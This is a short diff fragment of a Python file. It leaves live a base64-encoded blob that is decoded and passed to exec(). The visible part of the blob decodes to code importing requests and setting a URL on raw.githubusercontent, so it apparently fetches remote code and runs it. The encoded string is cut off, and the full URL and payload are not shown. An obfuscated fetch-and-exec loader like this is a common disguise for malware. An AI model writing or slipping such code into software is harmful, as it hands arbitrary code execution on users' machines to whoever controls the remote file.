@@ -8,4 +8,3 @@ code=b'aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBiYXNlNjQKCnVybCA9ICdodHRwczovL3Jhdy5naXRod
 
 import base64
 exec(base64.b64decode(code).decode('utf-8'))
-# exec(code)
